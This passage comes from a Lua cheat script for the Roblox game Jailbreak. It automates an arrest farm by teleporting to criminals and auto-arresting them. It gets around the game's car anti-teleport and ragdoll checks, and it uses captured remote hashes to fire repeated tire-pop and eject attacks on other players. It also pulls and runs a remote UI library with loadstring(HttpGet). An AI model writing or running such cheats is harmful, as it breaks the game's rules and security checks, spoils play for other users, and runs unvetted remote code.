                    TogglePlayerInput(false)
                    TeleportDebounce = false
                    wait(0.25)
                    if (LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(X, Y, Z)).Magnitude > 50 and LocalPlayer.Character:FindFirstChildWhichIsA("BoolValue") then tp(X, Y, Z) end
                elseif Method == "Tween Method" then
                    if not InHelicopter() and math.floor(Car.WheelFrontRight.Wheel.Position.Y) - math.floor(Car.Step.Position.Y) >= 2 then
                        VirtualInputManager:SendKeyEvent(true, "V", false, game)
                        wait()
                        VirtualInputManager:SendKeyEvent(false, "V", false, game)
                        wait(0.5)
                        getgenv().ExitVehicle()
                        wait(0.5)
                        Method = "Velocity Method"
                        TogglePlayerInput(false)
                        TeleportDebounce = false
                        tp(X, Y, Z)
                        return
                    end
                    local Time = (Car.Engine.Position - Vector3.new(X, Y, Z)).Magnitude/500
                    Car:SetPrimaryPartCFrame(CFrame.new(Car.Engine.Position.X, 1000, Car.Engine.Position.Z))
                    local CFrameValue = Instance.new("CFrameValue")
                    CFrameValue.Value = Car:GetPrimaryPartCFrame()
                    workspace.Gravity = 100
                    local connection = CFrameValue:GetPropertyChangedSignal("Value"):Connect(function()
                        Car:SetPrimaryPartCFrame(CFrameValue.Value)
                    end)
                    local tween = game:GetService("TweenService"):Create(CFrameValue, TweenInfo.new(Time, Enum.EasingStyle.Linear), {Value = CFrame.new(X, 1000, Z)})
                    tween:Play()
                    tween.Completed:Wait()
                    Car:SetPrimaryPartCFrame(CFrame.new(X, Y, Z))
                    workspace.Gravity = 196.2
                    connection:Disconnect()
                    CFrameValue:Destroy()
                    TogglePlayerInput(false)
                    TeleportDebounce = false
                    wait(0.25)
                    if (LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(X, Y, Z)).Magnitude > 50 and LocalPlayer.Character:FindFirstChildWhichIsA("BoolValue") then spawn(function() tp(X, Y, Z) end) end
                end
                return
            elseif v.Name == "PlayerName" and v.Value == LocalPlayer.Name and v.Parent.Name == "Passenger" then
                getgenv().ExitVehicle()
                TogglePlayerInput(false)
                TeleportDebounce = false
                tp(X, Y, Z)
                return
            end
        end
    else
        local ClosestCars = {}
        local temp_distance = math.huge
        SetBlacklistedVehicles()
        for I,V in pairs(workspace.Vehicles:GetChildren()) do
            if V.Seat:FindFirstChild("PlayerName") and V.Seat.PlayerName.Value == "" and not V.BoundingBox:FindFirstChild("MoneyBillboard") and not table.find(VehiclesInBlacklist, V) and V.Make.Value ~= "Heli" and V.Make.Value ~= "BlackHawk" and V.Make.Value ~= "Wraith" and V.Make.Value ~= "SWATVan" and V.Make.Value ~= "BankTruck" then
                if (LocalPlayer.Character.HumanoidRootPart.Position - V.Engine.Position).Magnitude < temp_distance then
                    temp_distance = (LocalPlayer.Character.HumanoidRootPart.Position - V.Engine.Position).Magnitude
                    table.insert(ClosestCars, V)
                end
            end
        end
        for I,V in pairs(ClosestCars) do
            local amt = 75
            repeat
                pcall(function()
                    LocalPlayer.Character.HumanoidRootPart.CFrame = ClosestCars[1 + #ClosestCars - I].Model.Body.CFrame + Vector3.new(0, 5, 0)
                end)
                wait()
                RemotesTable.Remote:FireServer(getgenv().Hashes.EnterVehicle, ClosestCars[1 + #ClosestCars - I], ClosestCars[1 + #ClosestCars - I].Seat)
                amt = amt - 1
            until LocalPlayer.Character:FindFirstChild("InVehicle") and LocalPlayer.PlayerGui.HotbarGui.ContainerNitro.Visible == true or amt <= 0
            if LocalPlayer.Character:FindFirstChild("InVehicle") and LocalPlayer.PlayerGui.HotbarGui.ContainerNitro.Visible == true then 
                wait(0.5)
                TogglePlayerInput(false)
                TeleportDebounce = false
                tp(X, Y, Z)
                return
            end
        end
        local Distances = {}
        function getLowest()
            local low = math.huge
            local index
            for i, v in pairs(Distances) do
                if v < low then
                    low = v
                    index = i
                end
            end
            return Distances[index]
        end
        for i, v in pairs(workspace.VehicleSpawns:GetChildren()) do
            if not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
            if v.Name == "Camaro" or v.Name == "Jeep" then
                local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - v.Region.Position).Magnitude
                table.insert(Distances, tonumber(Distance))
            end
        end
        for i, v in pairs(workspace.VehicleSpawns:GetChildren()) do
            if not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
            if v.Name == "Camaro" or v.Name == "Jeep" then
                if (LocalPlayer.Character.HumanoidRootPart.Position - v.Region.Position).Magnitude <= getLowest() then
                    local Pos = v.Region.Position
                    BackupTP(Pos.X, Pos.Y, Pos.Z)
                    TogglePlayerInput(false)
                    TeleportDebounce = false
                    tp(X, Y, Z)
                    return
                end
            end
        end
    end
    end)
    TogglePlayerInput(false)
    TeleportDebounce = false
end

--Whitelist
Whitelist = {}
pcall(function()
    local function iterPageItems(pages)
        return coroutine.wrap(function()
            local pagenum = 1
            while true do
                for _, item in ipairs(pages:GetCurrentPage()) do
                    coroutine.yield(item, pagenum)
                end
                if pages.IsFinished then
                    break
                end
                pages:AdvanceToNextPageAsync()
                pagenum = pagenum + 1
            end
        end)
    end
    local friendPages = Players:GetFriendsAsync(LocalPlayer.UserId)
    for item, pageNo in iterPageItems(friendPages) do
        table.insert(Whitelist, item.Username)
    end
end)
function AddToWhitelist(PlayerName)
    for i, v in pairs(Players:GetPlayers()) do 
        if v.Name:lower():sub(1, #PlayerName) == PlayerName:lower() then
            if v.Name ~= LocalPlayer.Name then
                for i2, v2 in pairs(Whitelist) do
                    if v2:lower():sub(1, #PlayerName) == PlayerName:lower() then
                        jailbreakNotify(v2.." has already been whitelisted!", 5)
                        return 
                    end
                end
                table.insert(Whitelist, v.Name)
                jailbreakNotify(v.Name.." has been whitelisted!", 5)
                return
            else
                jailbreakNotify("You don't need to whitelist yourself!", 5)
                return
            end
        end
    end
    jailbreakNotify(PlayerName.." is not a real player!", 5)
end
function RemoveFromWhitelist(PlayerName)
    if #Whitelist == 0 then
        jailbreakNotify("There are no whitelisted players!", 5)
        return
    end
    for i, v in pairs(Whitelist) do
        if v:lower():sub(1, #PlayerName) == PlayerName:lower() then
            jailbreakNotify(v.." has been removed from the whitelist!", 5)
            for i2, v2 in pairs(Whitelist) do
                if v2 == v then
                    table.remove(Whitelist, i2)
                end
            end
            return
        end
    end
    jailbreakNotify(PlayerName.." could not be found in the whitelist!", 5)
end

--Is Equipped
function IsEquipped(item_name)
    local Table = require(ReplicatedStorage.Game.ItemSystem.ItemSystem).GetLocalEquipped()
    if not Table then return false end
    if item_name ~= "any" and tostring(Table.Model) == item_name then
        return true
    elseif item_name == "any" then
        return true
    end
    return false
end

--Equip Handcuffs
function EquipHandcuffs()
    local temp_var_1
    for i, v in pairs(getgc(true)) do
        if type(v) == "table" and rawget(v, "i") and rawget(v, "Frame") and rawget(v, "Name") then
            if v.Name == "Handcuffs" then
                temp_var_1 = v
            end
        end
    end
    require(ReplicatedStorage.Game.ItemSystem.ItemSystem).Equip(LocalPlayer, temp_var_1)
end

--Anti Ragdoll
function AntiRagdoll()
    require(ReplicatedStorage.Module.AlexRagdoll).Ragdoll = function() return wait(9e9) end
end

--Player Noclip
RunService.Stepped:Connect(function()
    if not ArrestFarm then return end
    for I,V in pairs(LocalPlayer.Character:GetDescendants()) do
        if V:IsA("BasePart") then
            V.CanCollide = false
        end
    end
end)

--Eject Aura
EjectAura = false
EjectAuraFunc = coroutine.create(function()
    while wait(0.3) do
        if not EjectAura then coroutine.yield() end
        pcall(function()
            for I,V in pairs(Players:GetPlayers()) do
                if V.Character:FindFirstChildWhichIsA("BoolValue") and not table.find(Whitelist, V.Name) and V.Name ~= LocalPlayer.Name and (LocalPlayer.Character.HumanoidRootPart.Position - V.Character.HumanoidRootPart.Position).Magnitude < 50 then
                    RemotesTable.Remote:FireServer(getgenv().Hashes.Eject, V.Name)
                end
            end
        end)
    end
end)

--Loop Tire Pop All
TirePop = false
TirePopFunc = coroutine.create(function()
    while wait(1) do
        if not TirePop then coroutine.yield() end
        pcall(function()
            for I,V in pairs(workspace.Vehicles:GetChildren()) do
                if V.Seat.PlayerName.Value ~= LocalPlayer.Name and not table.find(Whitelist, V.Seat.PlayerName.Value) then
                    RemotesTable.Remote:FireServer(getgenv().Hashes.PopTire, V, "Sniper")
                end
            end
        end)
    end
end)

--Invis Player
InvisPlayerToggle = false
spawn(function()
    while wait(0.3) do
        for I,V in pairs(LocalPlayer.Character:GetDescendants()) do
            if V:IsA('Hat') and V:FindFirstChild("Handle") then
                V = V.Handle
            elseif V:IsA('BasePart') and V.Name ~= "HumanoidRootPart" then
                if InvisPlayerToggle then V.Transparency = 1 else V.Transparency = 0 end
            elseif V:IsA('Decal') then
                if InvisPlayerToggle then V.Transparency = 1 else V.Transparency = 0 end
            end
        end
    end
end)

--Invis Car
spawn(function()
    while wait(0.3) do
        for I,V in pairs(workspace.Vehicles:GetChildren()) do
            if V.Seat:FindFirstChild("PlayerName") and V.Seat.PlayerName.Value == LocalPlayer.Name then
                for I2,V2 in pairs(V:GetDescendants()) do
                    pcall(function() V2.Transparency = 1 end)
                    if V2:IsA("Sound") then V2:Destroy() end
                end
            end
        end
    end
end)

--Death Handler
DiedDebounce = false
LocalPlayer.CharacterAdded:Connect(function()
    if ArrestFarm and SwitchServers and not StartDebounce then
        TeleportToRandomServer() 
    elseif ArrestFarm and not SwitchServers and not StartDebounce then
        DiedDebounce = true
    end
end)

--Platform
function Platform()
    local Platform = Instance.new("Part", workspace)
    Platform.Name = "Platform"
    Platform.Transparency = 1
    Platform.Anchored = true
    RunService.Heartbeat:Connect(function()
        Platform.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -3.599, 0)
    end)
end

--Bypass Car Anti Teleport
function BypassCarAntiTeleport()
    SetStatus("Starting arrest farm..")
    for i, v in pairs(workspace.Vehicles:GetChildren()) do
        SetBlacklistedVehicles()
        if v.Make.Value == "Camaro" or v.Make.Value == "Jeep" and v.Seat.Player.Value == false and v.Seat.PlayerName.Value == "" and not table.find(VehiclesInBlacklist, v) then
            local amt = 75
            repeat
                if not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
                LocalPlayer.Character.HumanoidRootPart.CFrame = v.Model.Body.CFrame + Vector3.new(0, 3, 0)
                wait()
                RemotesTable.Remote:FireServer(getgenv().Hashes.EnterVehicle, v, v.Seat)
                amt = amt - 1
            until LocalPlayer.Character:FindFirstChild("InVehicle") and LocalPlayer.PlayerGui.HotbarGui.ContainerNitro.Visible == true or amt <= 0
        end
    end
    wait(3)
    getgenv().Hashes.ExitVehicle()
    wait(0.5)
end

--Main Arrest Farm
function ArrestFarmFunc()
    while wait() do
        if not ArrestFarm then return end
        if DiedDebounce then 
            SetStatus("Respawn detected, restarting in 30 seconds..")
            wait(30) 
            DiedDebounce = false 
        end
        NearestCrim = nil
        pcall(function()
            local MaxTeleportAttempts = 30
            local MaxArrestAttempts = 300
            local temp_distance_value = math.huge
            for I,V in pairs(game.Teams.Criminal:GetPlayers()) do
                if not V.Character:FindFirstChild("Handcuffs") and not table.find(PlayersInBlacklist, V.Name) and not table.find(Whitelist, V.Name) then
                    if (LocalPlayer.Character.HumanoidRootPart.Position - V.Character.HumanoidRootPart.Position).Magnitude < temp_distance_value then
                        temp_distance_value = (LocalPlayer.Character.HumanoidRootPart.Position - V.Character.HumanoidRootPart.Position).Magnitude
                        NearestCrim = V
                    end
                end
            end
            spawn(SetBlacklistedPlayers)
            repeat
                if DiedDebounce then 
                    SetStatus("Respawn detected, restarting in 30 seconds..")
                    wait(30) 
                    DiedDebounce = false 
                end
                if Spectating then
                    workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                    if NearestCrim.Character:FindFirstChild("InVehicle") then
                        for I,V in pairs(workspace.Vehicles:GetDescendants()) do
                            if V:IsA("StringValue") and V.Name == "PlayerName" and V.Parent.Parent.Name ~= "Jet" and V.Parent.Parent.Name ~= "Stunt" and V.Value == NearestCrim.Name then
                                workspace.CurrentCamera.CameraSubject = V.Parent.Parent.Camera
                            end
                        end
                    else
                        workspace.CurrentCamera.CameraSubject = NearestCrim.Character.Humanoid
                    end
                end
                if (LocalPlayer.Character.HumanoidRootPart.Position - NearestCrim.Character.HumanoidRootPart.Position).Magnitude > 50 then
                    if not TeleportDebounce then
                        SetStatus(("Teleporting to %s."):format(NearestCrim.Name))
                        tp(NearestCrim.Character.HumanoidRootPart.Position.X, NearestCrim.Character.HumanoidRootPart.Position.Y, NearestCrim.Character.HumanoidRootPart.Position.Z)
                        MaxTeleportAttempts = MaxTeleportAttempts - 1
                    end
                else
                    SetStatus(("Arresting %s."):format(NearestCrim.Name))
                    if LocalPlayer.Character:FindFirstChild("InVehicle") then getgenv().Hashes.ExitVehicle() wait(0.5) end
                    if (LocalPlayer.Character.HumanoidRootPart.Position - NearestCrim.Character.HumanoidRootPart.Position).Magnitude < 50 then
                        BackupTP(NearestCrim.Character.HumanoidRootPart.Position.X, NearestCrim.Character.HumanoidRootPart.Position.Y - 12, NearestCrim.Character.HumanoidRootPart.Position.Z)
                        if not IsEquipped("Handcuffs") then EquipHandcuffs() end
                        if NearestCrim.Character:FindFirstChild("InVehicle") then 
                            UpdateCallbacks()
                            for I,V in pairs(Callbacks.Eject) do
                                V:Callback(true)
                            end
                        end
                        RemotesTable.Remote:FireServer(getgenv().Hashes.Arrest, NearestCrim.Name)
                        MaxArrestAttempts = MaxArrestAttempts - 1
                    end
                end
            until NearestCrim.Character:FindFirstChild("Handcuffs") or NearestCrim.Team ~= game.Teams.Criminal or not LocalPlayer.Character or MaxTeleportAttempts <= 0 or MaxArrestAttempts <= 0
            if MaxArrestAttempts <= 0 then
                if SwitchServers then 
                    pcall(TeleportToRandomServer) 
                else 
                    SetStatus("Exceeded max arrest attempts, restarting in 30 seconds..") 
                    wait(30) 
                end
            end
        end)
        if NearestCrim == nil or #game.Teams.Criminal:GetPlayers() <= 0 or (#game.Teams.Police:GetPlayers() >= 12 and LocalPlayer.Team ~= game.Teams.Police) then 
            if SwitchServers then pcall(TeleportToRandomServer) else SetStatus("Waiting for more criminals..") end
        end
        wait()
    end
end

--Starts Arrest Farm
function StartArrestFarm()
    MakeBottomBorder(true)
    StartDebounce = true
    if LocalPlayer.Team ~= game.Teams.Police then SwitchToPolice() end
    AntiRagdoll()
    EjectAura = true
    coroutine.resume(EjectAuraFunc)
    TirePop = true
    coroutine.resume(TirePopFunc)
    Platform()
    BypassCarAntiTeleport()
    ArrestFarm = true
    spawn(ArrestFarmFunc)
    StartDebounce = false
end

--Stops Arrest Farm
function StopArrestFarm()
    MakeBottomBorder(false)
    ArrestFarm = false
    EjectAura = false
    TirePop = false
    if workspace:FindFirstChild("Platform") then workspace.Platform:Destroy() end
    SetStatus("Arrest Farm Disabled")
end

--FPS Handler
local FPSScreen = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
FPSScreen.Name = "FPS Screen"
FPSScreen.Parent = game.CoreGui
FPSScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
FPSScreen.Enabled = false
TextLabel.Parent = FPSScreen
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(0, 20, 0, 375)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "60 FPS"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 20.000
TextLabel.TextWrapped = true
UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = TextLabel
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(203, 215, 253)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(225, 226, 227))}
UIGradient.Parent = TextLabel
function dragify(Frame)
    dragToggle = nil
    dragSpeed = .25
    dragInput = nil
    dragStart = nil
    dragPos = nil

    function updateInput(input)
        Delta = input.Position - dragStart
        Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
    end

    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if (input.UserInputState == Enum.UserInputState.End) then
                    dragToggle = false
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if (input == dragInput and dragToggle) then
            updateInput(input)
        end
    end)
end
dragify(TextLabel)
local LastIteration, Start
local FrameUpdateTable = {}
function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end

	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	TextLabel.Text = "" .. CurrentFPS .. " FPS"
end
Start = tick()
RunService.Heartbeat:Connect(HeartbeatUpdate)

LoadingWindow.Complete()

--UI https://pastebin.com/raw/dP1XYChT
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()
local venyx = library.new(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)

--Themes
local themes = {
    Background = Color3.fromRGB(24, 24, 24),
    Glow = Color3.fromRGB(0, 0, 0),
    Accent = Color3.fromRGB(10, 10, 10),
    LightContrast = Color3.fromRGB(20, 20, 20),
    DarkContrast = Color3.fromRGB(14, 14, 14),
    TextColor = Color3.fromRGB(255, 255, 255)
}

local page1 = venyx:addPage("Main")
local page2 = venyx:addPage("Status")
local page3 = venyx:addPage("Info/Settings")

--Page 1
local FirstSection1 = page1:addSection("ArrestFarm")

FirstSection1:addToggle(
    "Arrest Farm",
    nil,
    function(value)
        if ArrestFarmSetting and value then return end
        ArrestFarmSetting = value
        if StartDebounce then
            FirstSection1:updateToggle("Arrest Farm", "Arrest Farm", true)
            jailbreakNotify("The Arrest Farm is starting please wait to disable..", 5)
        else
            if value then
                spawn(StartArrestFarm)
            else
                spawn(StopArrestFarm)
            end
        end
    end
)
FirstSection1:addToggle(
    "Server Hop",
    nil,
    function(value)
        SwitchServers = value
    end
)
FirstSection1:addToggle(
    "Invis Player CS",
    nil,
    function(value)
        InvisPlayerToggle = value
    end
)
FirstSection1:addToggle(
    "View Criminals While Arrest Farming",
    nil,
    function(value)
        Spectating = value
        if not value then
            pcall(function()
                if LocalPlayer.Character:FindFirstChild("InVehicle") then
                    for I,V in pairs(workspace.Vehicles:GetDescendants()) do
                        if V:IsA("StringValue") and V.Name == "PlayerName" and V.Parent.Parent.Name ~= "Jet" and V.Parent.Parent.Name ~= "Stunt" and V.Value == LocalPlayer.Name then
                            workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                            workspace.CurrentCamera.CameraSubject = V.Parent.Parent.Camera
                        end
                    end
                else
                    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                    workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
                end
            end)
        end
    end
)

--Page 2
local SecondSection1 = page2:addSection("Arrest Farm Info")

local BountyLabel = SecondSection1:addButton("Total Server Bounty: $0")
spawn(function()
    while wait(0.3) do
        pcall(function()
            local Bounties = {}
            TotalAmount = 0
            for I,V in pairs(workspace.MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()) do
                if V:IsA("Frame") then
                    local String = string.gsub(V.Stats.Bounty.Text, "%D", "")
                    table.insert(Bounties, tonumber(String))
                end
            end
            for I,V in pairs(Bounties) do
                TotalAmount = TotalAmount + V
            end
            SecondSection1:updateButton(BountyLabel, "Total Server Bounty: $"..comma_value(TotalAmount))
        end)
    end
end)
local TotalMoneyMadeButton = SecondSection1:addButton("Total Money Made: $0")
spawn(function()
    while wait(0.3) do
        if isfile(TextFileName) then
            SecondSection1:updateButton(TotalMoneyMadeButton, "Total Money Made: "..readfile(TextFileName))
        else
            SecondSection1:updateButton(TotalMoneyMadeButton, "Total Money Made: $0")
        end
    end
end)
local MoneyMadeButton = SecondSection1:addButton("Money Made This Session: $0")
function SetMoneyMade(amount)
    SecondSection1:updateButton(MoneyMadeButton, "Money Made This Session: $"..comma_value(amount))
    TotalMoneyMadeThisSession = amount
end
local StatusButton = SecondSection1:addButton("Arrest Farm Disabled")
function SetStatus(Status)
    SecondSection1:updateButton(StatusButton, Status)
end

--Page 3
local ThirdSection1 = page3:addSection("Info")
local ThirdSection2 = page3:addSection("Whitelist")
local ThirdSection3 = page3:addSection("Settings")
ThirdSection1:addButton("Credits:")
ThirdSection1:addButton("alohabeach#3448 for scripting", function() setclipboard("alohabeach#3448") jailbreakNotify("Copied to clipboard.", 3) end)
ThirdSection1:addButton("Dino#3523 for ui library", function() setclipboard("Dino#3523") jailbreakNotify("Copied to clipboard.", 3) end)
ThirdSection2:addTextbox(
    "Add To Whitelist:",
    "PlayerName",
    function(value, focusLost)
        if focusLost and value ~= "" then
            AddToWhitelist(value)
        end
    end
)
ThirdSection2:addTextbox(
    "Remove From Whitelist:",
    "PlayerName",
    function(value, focusLost)
        if focusLost and value ~= "" then
            RemoveFromWhitelist(value)
        end
    end
)
ThirdSection2:addButton(
    "Print Whitelisted Players",
    function()
        if #Whitelist == 0 then 
            jailbreakNotify("There are no whitelisted players!", 10)
        else
            venyx:Notify("Whitelisted Players: ", table.concat(Whitelist, ", "))
        end
    end
)
ThirdSection3:addToggle(
    "Realistic Lighting",
    nil,
    function(value)
        RealisticLighting = value
        setfflag("ForceFutureIsBrightPhase3", tostring(value))
    end
)
ThirdSection3:addToggle(
    "Show FPS",
    nil,
    function(value)
        ShowFPS = value
        game.CoreGui["FPS Screen"].Enabled = value
    end
)
ThirdSection3:addKeybind(
    "Toggle Keybind",
    Enum.KeyCode.RightShift,
    function()
        venyx:toggle()
    end,
    function()
    end
)
for theme, color in pairs(themes) do
    ThirdSection3:addColorPicker(
        theme,
        color,
        function(color3)
            venyx:setTheme(theme, color3)
        end
    )
end

--Save
Players.PlayerRemoving:Connect(function(Player)
    if Player.Name == LocalPlayer.Name then
        if not isfile("JailbreakConfig") then
            makefolder("JailbreakConfig")
            writefile("JailbreakConfig/JailbreakAutoRob.txt", "")
            writefile("JailbreakConfig/JailbreakArrestFarm.txt", "")
            writefile("JailbreakConfig/OtherSettings.txt", "")
        end
        local Settings1, Settings2 = {}, {}
        Settings1.ArrestFarm = ArrestFarmSetting
        Settings1.ServerHop = SwitchServers
        Settings1.InvisPlr = InvisPlayerToggle
        Settings1.Spectate = Spectating
        Settings2.RealisticLighting = RealisticLighting
        Settings2.ShowFPS = ShowFPS
        writefile("JailbreakConfig/JailbreakArrestFarm.txt", HttpService:JSONEncode(Settings1))
        writefile("JailbreakConfig/OtherSettings.txt", HttpService:JSONEncode(Settings2))
    end
end)

--load
venyx:SelectPage(venyx.pages[1], true)
pcall(function()
    local LoadedSettings1 = HttpService:JSONDecode(readfile("JailbreakConfig/JailbreakArrestFarm.txt"))
    local LoadedSettings2 = HttpService:JSONDecode(readfile("JailbreakConfig/OtherSettings.txt"))
    if LoadedSettings1.ArrestFarm == true then
        FirstSection1:updateToggle("Arrest Farm", "Arrest Farm", true)
        ArrestFarm = true
        ArrestFarmSetting = true
        spawn(StartArrestFarm)
    end
    if LoadedSettings1.ServerHop == true then
        FirstSection1:updateToggle("Server Hop", "Server Hop", true)
        SwitchServers = true
    end
    if LoadedSettings1.InvisPlr == true then
        FirstSection1:updateToggle("Invis Player CS", "Invis Player CS", true)
        InvisPlayerToggle = true
    end
    if LoadedSettings1.Spectate == true then
        FirstSection1:updateToggle("View Criminals While Arrest Farming", "View Criminals While Arrest Farming", true)
        Spectating = true
    end
    if LoadedSettings2.RealisticLighting == true then
        SecondSection3:updateToggle("Realistic Lighting", "Realistic Lighting", true)
        RealisticLighting = true
        setfflag("ForceFutureIsBrightPhase3", "true")
    end
    if LoadedSettings2.ShowFPS == true then
        SecondSection3:updateToggle("Show FPS", "Show FPS", true)
        ShowFPS = true
        game.CoreGui["FPS Screen"].Enabled = true
    end
end)
